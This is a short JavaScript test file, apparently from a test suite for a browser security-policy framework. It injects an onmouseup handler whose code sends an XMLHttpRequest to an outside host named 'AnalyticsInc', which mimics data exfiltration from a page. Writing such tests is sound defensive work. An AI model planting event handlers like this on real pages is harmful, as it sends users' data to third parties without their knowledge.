// exfil_test_onmouseup1.js
var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=onmouseup1", true);xmlhttp.send(null);';
var v0 = document.getElementById("test");
JAM.call(v0.setAttribute, v0, ["onmouseup", exp])

